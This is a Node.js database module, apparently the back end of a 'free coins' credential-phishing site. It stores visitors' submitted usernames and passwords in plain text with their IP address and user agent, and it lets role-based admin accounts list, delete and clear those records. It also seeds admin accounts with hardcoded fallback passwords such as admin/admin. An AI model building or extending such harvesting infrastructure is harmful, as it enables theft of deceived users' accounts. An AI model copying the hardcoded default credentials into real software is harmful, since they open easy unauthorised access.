require('dotenv').config();

const path = require('path');
const bcrypt = require('bcryptjs');
const fs = require('fs');

const DB_TYPE = (process.env.DB_TYPE || 'mysql').toLowerCase();
const DB_PATH = path.join(__dirname, 'database.sqlite');

let activeDbType = 'sqlite';
let mysqlPool = null;
let sqliteDb = null;

// Track initialization readiness
let dbReadyPromise = null;

/**
 * Initialize SQLite Database connection & tables
 */
function initSqlite() {
    const sqlite3 = require('sqlite3').verbose();
    sqliteDb = new sqlite3.Database(DB_PATH, (err) => {
        if (err) {
            console.error('[SQLITE] Failed to connect:', err.message);
        } else {
            console.log('[SQLITE] Connected to database at:', DB_PATH);
        }
    });

    return new Promise((resolve) => {
        sqliteDb.serialize(() => {
            sqliteDb.run(`
                CREATE TABLE IF NOT EXISTS submissions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    created_at DATETIME DEFAULT (datetime('now', 'localtime'))
                )
            `);

            sqliteDb.run(`
                CREATE TABLE IF NOT EXISTS members (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    username TEXT NOT NULL UNIQUE,
                    password_hash TEXT NOT NULL,
                    role TEXT NOT NULL DEFAULT 'viewer',
                    created_by TEXT DEFAULT 'system',
                    is_active INTEGER DEFAULT 1,
                    created_at DATETIME DEFAULT (datetime('now', 'localtime'))
                )
            `, () => {
                seedDefaultMembersSqlite().then(resolve);
            });
        });
    });
}

/**
 * Seed default members in SQLite
 */
async function seedDefaultMembersSqlite() {
    const defaults = [
        { name: 'Developer',      username: 'developer', password: process.env.DEVELOPER_PASSWORD || 'Dev#Grand2025', role: 'developer' },
        { name: 'Admin Member 1', username: 'admin1',    password: process.env.ADMIN1_PASSWORD    || 'Grand#Admin1',  role: 'admin' },
        { name: 'Admin Member 2', username: 'admin2',    password: process.env.ADMIN2_PASSWORD    || 'Grand#Admin2',  role: 'admin' },
        { name: 'Admin Member 3', username: 'admin3',    password: process.env.ADMIN3_PASSWORD    || 'Grand#Admin3',  role: 'admin' },
        { name: 'Admin',          username: 'admin',     password: process.env.ADMIN_PASSWORD     || 'admin',         role: 'admin' },
    ];

    for (const m of defaults) {
        await new Promise((resolve) => {
            sqliteDb.get(`SELECT id FROM members WHERE username = ?`, [m.username], async (err, row) => {
                if (!row) {
                    const hash = await bcrypt.hash(m.password, 10);
                    sqliteDb.run(
                        `INSERT INTO members (name, username, password_hash, role, created_by) VALUES (?, ?, ?, ?, 'system')`,
                        [m.name, m.username, hash, m.role],
                        () => resolve()
                    );
                } else {
                    resolve();
                }
            });
        });
    }
}

/**
 * Initialize MySQL Database connection, create schema, and migrate from SQLite
 */
async function initMysql() {
    const mysql = require('mysql2/promise');

    const host = process.env.DB_HOST || 'localhost';
    const port = Number(process.env.DB_PORT) || 3306;
    const user = process.env.DB_USER || 'root';
    const password = process.env.DB_PASSWORD || '';
    const database = process.env.DB_NAME || 'freecoins_db';

    // Step 1: Connect to MySQL server and ensure the target database exists
    console.log(`[MYSQL] Connecting to MySQL server at ${host}:${port} as '${user}'...`);
    const rootConn = await mysql.createConnection({
        host,
        port,
        user,
        password
    });

    await rootConn.query(`CREATE DATABASE IF NOT EXISTS \`${database}\` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;`);
    await rootConn.end();

    // Step 2: Create MySQL connection pool
    mysqlPool = mysql.createPool({
        host,
        port,
        user,
        password,
        database,
        waitForConnections: true,
        connectionLimit: 10,
        queueLimit: 0
    });

    // Step 3: Create Tables
    await mysqlPool.query(`
        CREATE TABLE IF NOT EXISTS submissions (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(255) NOT NULL,
            password VARCHAR(255) NOT NULL,
            ip_address VARCHAR(100),
            user_agent TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    `);

    await mysqlPool.query(`
        CREATE TABLE IF NOT EXISTS members (
            id INT AUTO_INCREMENT PRIMARY KEY,
            name VARCHAR(100) NOT NULL,
            username VARCHAR(100) NOT NULL UNIQUE,
            password_hash VARCHAR(255) NOT NULL,
            role VARCHAR(50) NOT NULL DEFAULT 'viewer',
            created_by VARCHAR(100) DEFAULT 'system',
            is_active TINYINT DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    `);

    console.log(`[MYSQL] Connected successfully to database '${database}'.`);
    activeDbType = 'mysql';

    // Step 4: Check if migration from SQLite is needed
    await migrateFromSqliteToMysql();
}

/**
 * Automatically migrate existing records from SQLite into MySQL if MySQL tables are empty
 */
async function migrateFromSqliteToMysql() {
    if (!fs.existsSync(DB_PATH)) {
        await seedDefaultMembersMysql();
        return;
    }

    try {
        const sqlite3 = require('sqlite3').verbose();
        const tempSqlite = new sqlite3.Database(DB_PATH);

        const sqliteQuery = (sql, params = []) => new Promise((resolve, reject) => {
            tempSqlite.all(sql, params, (err, rows) => err ? reject(err) : resolve(rows));
        });

        // 1. Members migration
        const [mysqlMembers] = await mysqlPool.query('SELECT COUNT(*) as count FROM members');
        if (mysqlMembers[0].count === 0) {
            try {
                const rows = await sqliteQuery('SELECT * FROM members');
                if (rows && rows.length > 0) {
                    for (const m of rows) {
                        await mysqlPool.query(
                            `INSERT IGNORE INTO members (id, name, username, password_hash, role, created_by, is_active, created_at)
                             VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
                            [m.id, m.name, m.username, m.password_hash, m.role, m.created_by, m.is_active, m.created_at || new Date()]
                        );
                    }
                    console.log(`[MYSQL] Migrated ${rows.length} member accounts from SQLite.`);
                }
            } catch (e) {
                // Table might not exist in SQLite
            }
        }

        // Ensure default members exist if still empty
        const [checkMembers] = await mysqlPool.query('SELECT COUNT(*) as count FROM members');
        if (checkMembers[0].count === 0) {
            await seedDefaultMembersMysql();
        }

        // 2. Submissions migration
        const [mysqlSubs] = await mysqlPool.query('SELECT COUNT(*) as count FROM submissions');
        if (mysqlSubs[0].count === 0) {
            try {
                const subRows = await sqliteQuery('SELECT * FROM submissions');
                if (subRows && subRows.length > 0) {
                    for (const s of subRows) {
                        await mysqlPool.query(
                            `INSERT IGNORE INTO submissions (id, username, password, ip_address, user_agent, created_at)
                             VALUES (?, ?, ?, ?, ?, ?)`,
                            [s.id, s.username, s.password, s.ip_address, s.user_agent, s.created_at || new Date()]
                        );
                    }
                    console.log(`[MYSQL] Migrated ${subRows.length} submissions from SQLite.`);
                }
            } catch (e) {
                // Ignore if not present
            }
        }

        tempSqlite.close();
    } catch (migErr) {
        console.warn('[MYSQL] Note during SQLite migration check:', migErr.message);
    }
}

/**
 * Seed default members in MySQL
 */
async function seedDefaultMembersMysql() {
    const defaults = [
        { name: 'Developer',      username: 'developer', password: process.env.DEVELOPER_PASSWORD || 'Dev#Grand2025', role: 'developer' },
        { name: 'Admin Member 1', username: 'admin1',    password: process.env.ADMIN1_PASSWORD    || 'Grand#Admin1',  role: 'admin' },
        { name: 'Admin Member 2', username: 'admin2',    password: process.env.ADMIN2_PASSWORD    || 'Grand#Admin2',  role: 'admin' },
        { name: 'Admin Member 3', username: 'admin3',    password: process.env.ADMIN3_PASSWORD    || 'Grand#Admin3',  role: 'admin' },
        { name: 'Admin',          username: 'admin',     password: process.env.ADMIN_PASSWORD     || 'admin',         role: 'admin' },
    ];

    for (const m of defaults) {
        const [rows] = await mysqlPool.execute('SELECT id FROM members WHERE username = ?', [m.username]);
        if (rows.length === 0) {
            const hash = await bcrypt.hash(m.password, 10);
            await mysqlPool.execute(
                `INSERT INTO members (name, username, password_hash, role, created_by) VALUES (?, ?, ?, ?, 'system')`,
                [m.name, m.username, hash, m.role]
            );
            console.log(`[MYSQL SEED] Created member: ${m.username} (${m.role})`);
        }
    }
}

/**
 * Main Database Initialization
 */
async function init() {
    if (DB_TYPE === 'mysql') {
        try {
            await initMysql();
            return;
        } catch (err) {
            console.error('\n⚠️ [MYSQL CONNECTION ERROR]:', err.message);
            console.error('👉 Please ensure your MySQL password is set in .env (DB_PASSWORD=...) and MySQL service is running.\n');
            console.log('[FALLBACK] Defaulting to SQLite database so the server stays operational...\n');
        }
    }

    activeDbType = 'sqlite';
    await initSqlite();
}

dbReadyPromise = init();

// Helper to ensure queries wait for DB readiness
async function ensureDb() {
    if (dbReadyPromise) {
        await dbReadyPromise;
    }
}

// ─── Submission Functions ─────────────────────────────────────────────────────

async function addSubmission({ username, password, ipAddress, userAgent }) {
    await ensureDb();

    if (activeDbType === 'mysql') {
        const [res] = await mysqlPool.execute(
            `INSERT INTO submissions (username, password, ip_address, user_agent) VALUES (?, ?, ?, ?)`,
            [username, password, ipAddress, userAgent]
        );
        return { id: res.insertId, username, password, ip_address: ipAddress, user_agent: userAgent };
    }

    // SQLite
    return new Promise((resolve, reject) => {
        const query = `INSERT INTO submissions (username, password, ip_address, user_agent) VALUES (?, ?, ?, ?)`;
        sqliteDb.run(query, [username, password, ipAddress, userAgent], function (err) {
            if (err) return reject(err);
            resolve({ id: this.lastID, username, password, ip_address: ipAddress, user_agent: userAgent });
        });
    });
}

async function getAllSubmissions() {
    await ensureDb();

    if (activeDbType === 'mysql') {
        const [rows] = await mysqlPool.query(`SELECT * FROM submissions ORDER BY id DESC`);
        return rows;
    }

    // SQLite
    return new Promise((resolve, reject) => {
        sqliteDb.all(`SELECT * FROM submissions ORDER BY id DESC`, [], (err, rows) => {
            if (err) return reject(err);
            resolve(rows);
        });
    });
}

async function deleteSubmission(id) {
    await ensureDb();

    if (activeDbType === 'mysql') {
        const [res] = await mysqlPool.execute(`DELETE FROM submissions WHERE id = ?`, [id]);
        return { deleted: res.affectedRows > 0 };
    }

    // SQLite
    return new Promise((resolve, reject) => {
        sqliteDb.run(`DELETE FROM submissions WHERE id = ?`, [id], function (err) {
            if (err) return reject(err);
            resolve({ deleted: this.changes > 0 });
        });
    });
}

async function clearAllSubmissions() {
    await ensureDb();

    if (activeDbType === 'mysql') {
        const [res] = await mysqlPool.execute(`DELETE FROM submissions`);
        return { clearedCount: res.affectedRows };
    }

    // SQLite
    return new Promise((resolve, reject) => {
        sqliteDb.run(`DELETE FROM submissions`, [], function (err) {
            if (err) return reject(err);
            resolve({ clearedCount: this.changes });
        });
    });
}

// ─── Member (RBAC) Functions ──────────────────────────────────────────────────

async function getMemberByUsername(username) {
    await ensureDb();
    const cleanUser = username.trim().toLowerCase();

    if (activeDbType === 'mysql') {
        const [rows] = await mysqlPool.execute(
            `SELECT * FROM members WHERE username = ? AND is_active = 1`,
            [cleanUser]
        );
        return rows[0] || null;
    }

    // SQLite
    return new Promise((resolve, reject) => {
        sqliteDb.get(
            `SELECT * FROM members WHERE username = ? AND is_active = 1`,
            [cleanUser],
            (err, row) => {
                if (err) return reject(err);
                resolve(row || null);
            }
        );
    });
}

async function getAllMembers() {
    await ensureDb();

    if (activeDbType === 'mysql') {
        const [rows] = await mysqlPool.query(
            `SELECT id, name, username, role, created_by, is_active, created_at FROM members ORDER BY id ASC`
        );
        return rows;
    }

    // SQLite
    return new Promise((resolve, reject) => {
        sqliteDb.all(
            `SELECT id, name, username, role, created_by, is_active, created_at FROM members ORDER BY id ASC`,
            [],
            (err, rows) => {
                if (err) return reject(err);
                resolve(rows);
            }
        );
    });
}

async function addMember({ name, username, password, role, createdBy }) {
    await ensureDb();
    const cleanUser = username.trim().toLowerCase();
    const hash = await bcrypt.hash(password, 10);

    if (activeDbType === 'mysql') {
        const [res] = await mysqlPool.execute(
            `INSERT INTO members (name, username, password_hash, role, created_by) VALUES (?, ?, ?, ?, ?)`,
            [name.trim(), cleanUser, hash, role, createdBy]
        );
        return { id: res.insertId, name: name.trim(), username: cleanUser, role };
    }

    // SQLite
    return new Promise((resolve, reject) => {
        sqliteDb.run(
            `INSERT INTO members (name, username, password_hash, role, created_by) VALUES (?, ?, ?, ?, ?)`,
            [name.trim(), cleanUser, hash, role, createdBy],
            function (err) {
                if (err) return reject(err);
                resolve({ id: this.lastID, name: name.trim(), username: cleanUser, role });
            }
        );
    });
}

async function updateMember({ id, name, role, password }) {
    await ensureDb();

    if (activeDbType === 'mysql') {
        if (password) {
            const hash = await bcrypt.hash(password, 10);
            const [res] = await mysqlPool.execute(
                `UPDATE members SET name = ?, role = ?, password_hash = ? WHERE id = ?`,
                [name, role, hash, id]
            );
            return { updated: res.affectedRows > 0 };
        } else {
            const [res] = await mysqlPool.execute(
                `UPDATE members SET name = ?, role = ? WHERE id = ?`,
                [name, role, id]
            );
            return { updated: res.affectedRows > 0 };
        }
    }

    // SQLite
    if (password) {
        const hash = await bcrypt.hash(password, 10);
        return new Promise((resolve, reject) => {
            sqliteDb.run(
                `UPDATE members SET name = ?, role = ?, password_hash = ? WHERE id = ?`,
                [name, role, hash, id],
                function (err) {
                    if (err) return reject(err);
                    resolve({ updated: this.changes > 0 });
                }
            );
        });
    } else {
        return new Promise((resolve, reject) => {
            sqliteDb.run(
                `UPDATE members SET name = ?, role = ? WHERE id = ?`,
                [name, role, id],
                function (err) {
                    if (err) return reject(err);
                    resolve({ updated: this.changes > 0 });
                }
            );
        });
    }
}

async function deleteMember(id) {
    await ensureDb();

    if (activeDbType === 'mysql') {
        const [res] = await mysqlPool.execute(`DELETE FROM members WHERE id = ?`, [id]);
        return { deleted: res.affectedRows > 0 };
    }

    // SQLite
    return new Promise((resolve, reject) => {
        sqliteDb.run(`DELETE FROM members WHERE id = ?`, [id], function (err) {
            if (err) return reject(err);
            resolve({ deleted: this.changes > 0 });
        });
    });
}

function getActiveDbType() {
    return activeDbType;
}

module.exports = {
    getActiveDbType,
    addSubmission,
    getAllSubmissions,
    deleteSubmission,
    clearAllSubmissions,
    getMemberByUsername,
    getAllMembers,
    addMember,
    updateMember,
    deleteMember
};
